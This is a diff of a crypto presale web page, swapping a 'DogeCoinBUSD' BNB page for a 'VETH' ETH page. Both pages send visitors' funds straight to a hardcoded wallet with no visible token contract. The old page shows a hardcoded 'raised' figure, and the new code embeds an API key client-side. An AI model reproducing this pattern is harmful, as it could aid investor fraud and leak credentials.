@@ -1,366 +1,505 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>DCBUSD</title>
-    <link rel="shortcut icon" type="image/x-icon" href="logo.webp">
-    <meta charset="UTF-8" />
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" />
-
+    <title>VETH ETH Presale</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="bootstrap.min.css" />
-    <link rel="stylesheet" href="style.css" />
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Chewy&amp;display=swap" rel="stylesheet">
+
+    <link rel="shortcut icon" href="logo.png">
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        /* Simple progress bar style */
+        .progress-container {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 25px;
+            margin: 10px 0;
+            height: 25px;
+        }
+
+        .progress-bar {
+            height: 25px;
+            width: 0%;
+            background-color: #4caf50;
+            text-align: center;
+            color: white;
+            border-radius: 25px;
+            line-height: 25px;
+            font-weight: bold;
+        }
+
+        #countdown {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+    </style>
 </head>
 
-
-
 <body>
-    <div class="wrapper">
-        <!-- Sidebar  -->
 
 
-        <!-- Page Content  -->
-        <div id="content">
 
 
-
-            <div class="logo">
-                <img src="logo.webp" />
-                <span>DCBUSD</span>
-            </div>
-            <div id="app">
-                <div class="head">
-                    <div class="row">
-                        <div class="col-md-4">
-                            <div class="box">
-                                <p> Wallet</p>
-                                <p id="myacc">x00000000..</p>
-                            </div>
-                        </div>
-                        <div class="col-md-4">
-                            <div class="box">
-                                <p> BSC Network</p>
-                                <button class="btn" id="con" onclick="onPageLoad()">CONNECT</button></div>
-                        </div>
-                        <div class="col-md-4">
-                            <div class="box">
-                                <p> BNB Balance</p>
-                                <span id="mybalance">0.0BNB</span>
-                            </div>
-                        </div>
-
-                    </div>
-                </div>
-                <div class="container">
-                    <div class="row">
-                        <div class="col-md-3">
-                            <div class="box1">
-                                <div class="info">
-                                    <h2>SOCIAL LINKS</h2>
-                                    <ul class="social">
-                                        <li>
-                                            <a href="https://t.me/dogebusd"><img src="telegram.svg"></a>
-                                        </li>
-                                        <li>
-                                            <a href="https://twitter.com/DogeCoin_BUSD"><img src="twitter.svg"></a>
-                                        </li>
-                                        <li>
-                                            <a href="#"><img src="reddit.svg"></a>
-                                        </li>
-                                        <li>
-                                            <a href="#"><img src="github.svg"></a>
-                                        </li>
-                                    </ul>
-                                </div>
-                                <div class="tokenomics">
-                                    <h2>Tokenomics</h2>
-                                    <ul>
-                                        <li>Token Name: DogeCoinBUSD</li>
-                                        <li>Token tricker: DCBUSD</li>
-                                        <li>Token Supply: 100,000,000,000</li>
-                                        <li>Token Dec.: 18</li>
-                                        <li>Token type: BEP20</li>
-                                    </ul>
-                                </div>
-                            </div>
-
-                        </div>
-
-
-                        <div class="col-md-6">
-                            <div class="box1">
-                                <div class="title-area">
-                                    <h1 id="tokename">DogeCoinBUSD</h1>
-                                    <h2 id="tokensymbol">DCBUSD</h2>
-                                </div>
-                                <div id="desc">
-                                    DogeCoinBUSD is the ultimate token that allow you to earn BUSD as you HODL! DogeCoinBUSD, it is the way to financial freedom. With insane cashback in BUSD, this token is just gonna mooooon!. </div>
-                                <div class="contr">
-                                    <p>Presale Address : <a href="https://bscscan.com/address/0x74751474e3Bd520cfED38516cd69A9d79c959719"><span id="preddress">0x74751474e3Bd520cfED38516cd69A9d79c959719</span></a></p>
-                                    <p>Token Address : <a href="https://bscscan.com/token/0x88b215ee30d827eaec300240e6521e8ce0b89d2c"><span id="tkndress">0x88b215ee30d827eaec300240e6521e8ce0b89d2c</span> </a></p>
-                                    <span class="red">Do not send BNB to the token address!</span>
-                                </div>
-
-
-                                <div class="timer pt-4">
-                                    <img src="logo.webp" style="
-                width: 99px;
-                margin: auto;
-                display: block;
-                padding: 20px;
-            ">
-
-                                    <div id="countdown">
-                                        <h4>Presale end at:</h4>
-                                        <ul>
-                                            <li><span id="days"></span>day</li>
-                                            <li><span id="hours"></span>Hours</li>
-                                            <li><span id="minutes"></span>Minutes</li>
-                                            <li><span id="seconds"></span>Seconds</li>
-                                        </ul>
-                                    </div>
-
-                                </div>
-
-
-                                <div id="contents">
-                                    <div class="button-area">
-                                        <div class="balance-container">
-                                            <h3 id="headline"> </h3>
-                                            <div class="dbl">
-                                                <span id="devbalance">1.10</span>
-                                                <span>/</span>
-                                                <span id="am">20</span>
-                                                <span>BNB RAISED</span>
-
-                                                <input type="hidden" id="maxi" value="20"></input>
-                                                <P id="GFG">
-                                                </p>
-
-                                            </div>
-                                        </div>
-
-
-                                        <div class="input-container">
-                                            <img class="bnbi" src="bnb.svg" />
-                                            <input id="buyinput" class="input" value="0.01" placeholder="0.01"></input>
-                                        </div>
-                                        <p>Enter amount of BNB you want to contribute!</p>
-
-                                        <button class="btn" id="airbtn" onclick="buystt()"> <img src="buy.png" /><span>BUY TOKEN</span></button>
-
-                                    </div>
-                                    <div class="button-area">
-                                        <div class="balance-container">
-                                            <span id="locked-money">-</span>
-                                        </div>
-                                        <a class="btn btn-disable" id="withdraw">
-                                            <img src="buy.png" />
-                                            <span>CLAIM TOKEN</span>
-                                        </a>
-                                    </div>
-
-                                </div>
-                                <div class="contribute">
-                                    <br>
-
-                                    <div class="row">
-
-                                        <div class="col-md-6">
-                                            <div class="box1">
-                                                Your Contributed Amount:
-                                                <span id="contrib">0.00 </span>
-                                                <span id="contrib">BNB</span>
-                                            </div>
-                                        </div>
-                                        <div class="col-md-6">
-                                            <div class="box1">
-                                                Your Reserved Tokens::
-                                                <span id="contrib">0.00</span>
-                                                <span id="contrib">DCBUSD</span>
-                                            </div>
-                                        </div>
-                                    </div>
-
-
-
-
-
-
-                                </div>
-
-                            </div>
-                        </div>
-
-                        <div class="col-md-3">
-                            <div class="box1">
-                                <h2>PRESALE INFO</h2>
-                                <div class="details">
-                                    <table>
-                                        <tbody>
-
-                                            <tr>
-                                                <td>Token Name</td>
-                                                <td>DogeCoinBUSD</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Token Tricker</td>
-                                                <td>DCBUSD</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Supply</td>
-                                                <td>100,000,000,000</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Token Decimal</td>
-                                                <td>18</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Soft Cap</td>
-                                                <td>5 BNB</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Hard Cap</td>
-                                                <td>20 BNB</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Presale Rate</td>
-                                                <td>1,000,000,000 DCBUSD per BNB</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Minimum Contribution </td>
-                                                <td>0.01 BNB</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Maximum Contribution </td>
-                                                <td>4 BNB</td>
-                                            </tr>
-
-                                            <tr>
-                                                <td>PancakeSwap Listing Rate</td>
-                                                <td>830,000,000 DCBUSD per BNB</td>
-                                            </tr>
-                                            <tr>
-                                                <td>Liquidity locked</td>
-                                                <td>70%</td>
-                                            </tr>
-
-                                        </tbody>
-                                    </table>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-
-
-                <script src="web3.js"></script>
-                <script>
-                    let addr;
-                    const presaleadd = "0x74751474e3Bd520cfED38516cd69A9d79c959719";
-
-
-                    const loadweb3 = async() => {
-                        try {
-                            web3 = new web3js.myweb3(window.ethereum);
-
-                            let a = await ethereum.enable();
-                            addr = web3.utils.toChecksumAddress(a[0]);
-
-                            return (addr);
-
-                        } catch (error) {
-                            if (error.code === 4001) {
-                                console.log('Please connect to MetaMask.')
-                            } else {
-                                console.error(error)
-                            }
-                        }
-
-                    };
-
-
-
-
-
-                    const buystt = async() => {
-
-                        await loadweb3();
-
-                        if (addr == undefined) {
-                            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
-                        }
-
-                        let ethval = document.getElementById("buyinput").value;
-                        ethval = Number(ethval) * 1e18;
-
-                        web3.eth.sendTransaction({
-                            from: addr,
-                            to: presaleadd,
-                            value: ethval,
-                            gasLimit: 21000,
-                            gasPrice: 20000000000
-                        }, (err, res) => {
-                            if (!err) console.log(res);
-                            else console.log(err);
-                        });
-
-                    }
-                </script>
-
-
-                <script src="script.js"></script>
-                <script src="wesb3.min.js"></script>
-
-
-                <script>
-                    (function() {
-                        const second = 1000,
-                            minute = second * 60,
-                            hour = minute * 60,
-                            day = hour * 24;
-
-                        let launch = "july 4, 2021 14:00:00",
-                            countDown = new Date(launch).getTime(),
-                            x = setInterval(function() {
-
-                                let now = new Date().getTime(),
-                                    distance = countDown - now;
-
-                                document.getElementById("days").innerText = Math.floor(distance / (day)),
-                                    document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
-                                    document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
-                                    document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
-
-                                //do something later when date is reached
-                                if (distance < 0) {
-                                    let headline = document.getElementById("headline"),
-                                        countdown = document.getElementById("countdown"),
-                                        contents = document.getElementById("contents");
-
-                                    headline.innerText = " PRESALE IS LIVE ";
-                                    countdown.style.display = "none";
-                                    contents.style.display = "block";
-
-
-
-
-                                    clearInterval(x);
-                                }
-                                //seconds
-                            }, 0)
-                    }());
-                </script>
-
-
-
-            </div>
+    <div id="sidebar" class="sidebar">
+          <button class=" hamburger" onclick="toggleSidebar()">☰</button>
+        <div class="logo">
+            <a href="/">
+                <img style="width: 30px;" src="logo.png">
+                <span class="logo-text">VETH</span>
+            </a>
+        
+       <ul class="menu">
+    <li>
+        <span class="icon">
+            <!-- Home icon -->
+         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-house h-5 w-5"><path d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"></path><path d="M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>
+        </span>
+        <span class="label"><a href="/">Home</a></span>
+    </li>
+    <li>
+        <span class="icon">
+            <!-- Mining / Pickaxe icon -->
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pickaxe h-5 w-5"><path d="M14.531 12.469 6.619 20.38a1 1 0 1 1-3-3l7.912-7.912"></path><path d="M15.686 4.314A12.5 12.5 0 0 0 5.461 2.958 1 1 0 0 0 5.58 4.71a22 22 0 0 1 6.318 3.393"></path><path d="M17.7 3.7a1 1 0 0 0-1.4 0l-4.6 4.6a1 1 0 0 0 0 1.4l2.6 2.6a1 1 0 0 0 1.4 0l4.6-4.6a1 1 0 0 0 0-1.4z"></path><path d="M19.686 8.314a12.501 12.501 0 0 1 1.356 10.225 1 1 0 0 1-1.751-.119 22 22 0 0 0-3.393-6.319"></path></svg>
+        </span>
+        <span class="label"><a href="/">VETH Mining</a></span>
+    </li>
+    <li>
+        <span class="icon">
+            <!-- Bank icon -->
+           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-landmark h-5 w-5"><line x1="3" x2="21" y1="22" y2="22"></line><line x1="6" x2="6" y1="18" y2="11"></line><line x1="10" x2="10" y1="18" y2="11"></line><line x1="14" x2="14" y1="18" y2="11"></line><line x1="18" x2="18" y1="18" y2="11"></line><polygon points="12 2 20 7 4 7"></polygon></svg>
+        </span>
+        <span class="label"><a href="/">VETH Stake Bank</a></span>
+    </li>
+    <li>
+        <span class="icon">
+            <!-- Game controller icon -->
+           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-gamepad2 h-5 w-5"><line x1="6" x2="10" y1="11" y2="11"></line><line x1="8" x2="8" y1="9" y2="13"></line><line x1="15" x2="15.01" y1="12" y2="12"></line><line x1="18" x2="18.01" y1="10" y2="10"></line><path d="M17.32 5H6.68a4 4 0 0 0-3.978 3.59c-.006.052-.01.101-.017.152C2.604 9.416 2 14.456 2 16a3 3 0 0 0 3 3c1 0 1.5-.5 2-1l1.414-1.414A2 2 0 0 1 9.828 16h4.344a2 2 0 0 1 1.414.586L17 18c.5.5 1 1 2 1a3 3 0 0 0 3-3c0-1.545-.604-6.584-.685-7.258-.007-.05-.011-.1-.017-.151A4 4 0 0 0 17.32 5z"></path></svg>
+        </span>
+        <span class="label"><a href="/">VETH Games</a></span>
+    </li>
+</ul>
+</div>
+
+<!-- Socials at bottom -->
+<div class="socials">
+    <a href="https://t.me/#" target="_blank" class="social-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 2L11 13"></path>
+            <path d="M22 2l-7 20-4-9-9-4 20-7z"></path>
+        </svg>
+    </a>
+    <a href="https://twitter.com/#" target="_blank" class="social-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path
+                d="M23 3a10.9 10.9 0 0 1-3 1 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+            </path>
+        </svg>
+    </a>
+</div>
+
+
+ 
+    </div>
+
+
+    <header class="topbar">
+
+      
+        <div class="nav-left">
+           
         </div>
+
+        <div class="nav-right">
+
+
+
+
+            <!-- Light/Dark Toggle -->
+            <button class="icon-btn" onclick="toggleTheme()" title="Toggle theme">
+                🌙
+            </button>
+
+            <!-- Profile Icon -->
+            <div class="profile">
+                👤
+                <p id="myacc">Not Connected</p>
+            </div>
+
+            <!-- Connect Wallet -->
+        <!-- Connect Button -->
+<button class="btn connect-btn" id="connectBtn">
+    Connect
+</button>
+
+<!-- Wallet Modal -->
+
+</div>
+        </div>
+    </header>
+
+    <div id="main-content" class="main-content"  >
+
+
+
+
+
+        <div class="warp">
+
+
+
+            <div class="presale-layout">
+
+                <!-- LEFT / MAIN COLUMN -->
+                <div class="main-column">
+                    <div class="box1">
+
+                        <div class="dot-glow"></div>
+                        <div class="dot-bg"></div>
+
+                        <h1 class="title"><img style="width: 50px;" src="logo.png" alt="VETH Logo"> VETH Presale</h1>
+                        <p class="subtitle">
+                            Secure ETH presale with transparent on-chain funding
+                        </p>
+                        <!---
+            <div class="wallet-box">
+                <span>Presale Wallet</span>
+                <strong>0x27A75b4e4425313eEAb0685AbA66Fe4557e79c10</strong>
+            </div>-->
+
+                        <div class="input-container">
+                            <input id="buyinput" value="0.01" placeholder="Amount in ETH">
+                        </div>
+
+                        <button class="btn buy-btn w-100" onclick="sendETH()">
+                            Buy with ETH
+                        </button>
+
+                        <p id="status" class="status-text"></p>
+
+                        <div id="countdown" class="countdown">
+                            Presale ends in: --
+                        </div>
+
+                        <div class="progress-container">
+                            <div class="progress-bar" id="progress-bar">
+                                0 / 100 ETH
+                            </div>
+                        </div>
+
+                        <!-- TRANSACTION HISTORY (INSIDE MAIN BOX) -->
+
+                        <div class="tx-section">
+                            <h3>Recent Contributions</h3>
+                      <ul class="tx-list" id="txList"></ul>
+                      </div>
+
+                    </div>
+                </div>
+
+                <!-- RIGHT COLUMN (UNCHANGED) -->
+                <div class="side-box">
+                    <div class="wallet-row">
+                        <span class="user-icon">👤</span>
+
+                        <div class="wallet-info">
+
+                            <span id="mybalance" class="balance">0.0 ETH</span>
+                            <span class="label">ETH Balance</span>
+                        </div>
+                    </div>
+
+
+                    <h3>Your Holdings</h3>
+
+                    <div class="info-row">
+                        <span>VETH Balance</span>
+                        <strong>0.00 VETH</strong>
+                    </div>
+
+                    <div class="info-row">
+                        <span>Claimable</span>
+                        <strong>0.00 VETH</strong>
+                    </div>
+
+                    <button class="btn claim-btn" disabled>
+                        CLAIM TOKENS
+                    </button>
+
+                    <p class="claim-note">
+                        Claim will be enabled after presale ends
+                    </p>
+
+
+                    <div class="video-container">
+    <video autoplay muted loop playsinline>
+        <source src="vid.MP4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+</div>
+
+
+                </div>
+
+            </div>
+
+
+
+
+
+        </div>
+
+
+    </div>
+
+    <div id="walletModal" class="modal">
+     <div class="modal-content">
+        <span class="close">&times;</span>
+        <h3>Choose Wallet</h3>
+
+        <button class="wallet-option" onclick="connectWallet('metamask')">
+            <img src="meta.svg" alt="MetaMask" class="wallet-icon"> MetaMask
+        </button>
+
+        <button class="wallet-option" onclick="connectWallet('trust')">
+            <img src="trust.webp" alt="Trust Wallet" class="wallet-icon"> Trust Wallet
+        </button>
+
+        <button class="wallet-option" onclick="connectWallet('base')">
+            <img src="base.svg" alt="Base Wallet" class="wallet-icon"> Base Wallet
+        </button>
+    </div>
+</div>
+
+
+    <script>
+        let web3;
+        let userAccount;
+
+        // Presale wallet
+        const presaleAddress = "0x27A75b4e4425313eEAb0685AbA66Fe4557e79c10";
+        const maxCap = 100; // Max ETH
+
+        // Presale end date
+        const presaleEnd = new Date("2026-01-10T23:59:59Z").getTime();
+
+
+const connectBtn = document.getElementById("connectBtn");
+const walletModal = document.getElementById("walletModal");
+const closeModal = walletModal.querySelector(".close");
+
+// Open modal on connect button click
+connectBtn.onclick = () => {
+    walletModal.style.display = "block";
+}
+
+// Close modal on "x"
+closeModal.onclick = () => {
+    walletModal.style.display = "none";
+}
+
+// Close modal if clicked outside
+window.onclick = (event) => {
+    if (event.target == walletModal) {
+        walletModal.style.display = "none";
+    }
+}
+
+        // Connect wallet
+     // Connect wallet (Ethereum Mainnet)
+async function connectWallet(type) {
+    try {
+        if (!window.ethereum) {
+            alert("EVM Wallet not detected");
+            return;
+        }
+
+        // ✅ Switch to Ethereum Mainnet ONLY
+        await ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x1' }] // Ethereum Mainnet
+        });
+
+        // Request account
+        const accounts = await ethereum.request({
+            method: 'eth_requestAccounts'
+        });
+        userAccount = accounts[0];
+
+        web3 = new Web3(window.ethereum);
+
+        // Update UI
+        document.getElementById("myacc").innerText =
+            userAccount.slice(0, 6) + "..." + userAccount.slice(-4);
+
+        const balance = await web3.eth.getBalance(userAccount);
+        document.getElementById("mybalance").innerText =
+            parseFloat(web3.utils.fromWei(balance, "ether")).toFixed(4) + " ETH";
+
+        // Close modal
+        walletModal.style.display = "none";
+
+        console.log("Connected to Ethereum Mainnet:", userAccount);
+
+    } catch (err) {
+        console.error("Wallet connection failed:", err);
+
+        if (err.code === 4001) {
+            alert("User rejected network switch or connection");
+        } else {
+            alert("Please switch to Ethereum Mainnet");
+        }
+    }
+}
+
+
+
+        // Send ETH
+        async function sendETH() {
+            if (!userAccount) await connectWallet();
+
+            const amount = parseFloat(document.getElementById("buyinput").value);
+            if (isNaN(amount) || amount <= 0) {
+                alert("Invalid ETH amount");
+                return;
+            }
+
+            try {
+                const tx = await web3.eth.sendTransaction({
+                    from: userAccount,
+                    to: presaleAddress,
+                    value: web3.utils.toWei(amount.toString(), "ether")
+                });
+
+                document.getElementById("status").innerText =
+                    "Transaction sent: " + tx.transactionHash;
+
+                updateProgress(); // refresh progress after tx
+            } catch (err) {
+                console.error(err);
+                document.getElementById("status").innerText = "Transaction failed";
+            }
+        }
+
+        // Update presale wallet balance and progress
+        async function updateProgress() {
+            if (!web3) web3 = new Web3(window.ethereum);
+
+            const balanceWei = await web3.eth.getBalance(presaleAddress);
+            const balanceEth = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
+            const percent = Math.min((balanceEth / maxCap) * 100, 100);
+
+            const progressBar = document.getElementById("progress-bar");
+            progressBar.style.width = percent + "%";
+            progressBar.innerText = balanceEth.toFixed(4) + " ETH / " + maxCap + " ETH";
+        }
+
+        // Countdown timer
+        function startCountdown() {
+            const countdownEl = document.getElementById("countdown");
+            setInterval(() => {
+                const now = new Date().getTime();
+                const distance = presaleEnd - now;
+
+                if (distance < 0) {
+                    countdownEl.innerText = "Presale Ended";
+                    return;
+                }
+
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                countdownEl.innerText = `Presale ends in: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+            }, 1000);
+        }
+
+        // Initial load
+        window.addEventListener('load', async () => {
+            startCountdown();
+            updateProgress();
+            // Refresh every 10 seconds to update presale wallet balance
+            setInterval(updateProgress, 10000);
+        });
+    </script>
+    <script>
+        function toggleTheme() {
+            document.body.classList.toggle("light");
+        }
+    </script>
+
+   <script>
+function toggleSidebar() {
+    const sidebar = document.getElementById("sidebar");
+    sidebar.classList.toggle("collapsed");
+}
+</script>
+
+ 
+
+ <script>
+    const MORALIS_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImZiZWMxZjVhLTAzY2EtNDg4My1hZDZjLTQ5MjgyOGZiMDRjYyIsIm9yZ0lkIjoiMjY2NTAzIiwidXNlcklkIjoiMjcxMTQ2IiwidHlwZUlkIjoiOGMxYjc1ZDUtZmMyMi00Y2YxLThlOGYtM2NiNTRmYzYyYmMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2ODIwNTEwOTksImV4cCI6NDgzNzgxMTA5OX0.CFyk2Y2qAihLgswhe5tzOpHnaYAyy-_gPm6-mn3_xN0";
+ 
+const txListEl = document.getElementById('txList'); 
+
+// Fetch recent incoming transactions
+ async function fetchRecentTx() {
+    try {
+        const url = `https://deep-index.moralis.io/api/v2/${presaleAddress}?chain=eth&limit=10`;
+        
+        const res = await fetch(url, {
+            headers: {
+                'accept': 'application/json',
+                'X-API-Key': MORALIS_API_KEY
+            }
+        });
+
+        const data = await res.json();
+        console.log("TX List API response:", data); // ✅ check console
+
+        if(data.result && data.result.length) {
+            txListEl.innerHTML = "";
+            let count = 0;
+            data.result.forEach(tx => {
+                // Only show incoming transactions
+                if(tx.to_address.toLowerCase() === presaleAddress.toLowerCase() && count < 5){
+                    const from = tx.from_address;
+                    const valueEth = (tx.value / 1e18).toFixed(4);
+
+                    const li = document.createElement('li');
+                    li.innerHTML = `<span class="addr">${from.slice(0,6)}...${from.slice(-4)}</span>
+                                    <span class="amt">${valueEth} ETH</span>`;
+                    txListEl.appendChild(li);
+                    count++;
+                }
+            });
+
+            if(count === 0){
+                txListEl.innerHTML = "<li>No recent incoming transactions</li>";
+            }
+        } else {
+            txListEl.innerHTML = "<li>No transactions</li>";
+        }
+    } catch(err) {
+        console.error("Error fetching transactions:", err);
+        txListEl.innerHTML = "<li>Error fetching transactions</li>";
+    }
+}
+
+// Initial load
+fetchRecentTx();
+
+// Refresh every 15 seconds
+setInterval(fetchRecentTx, 15000);
+</script>
+
+
 
 
 
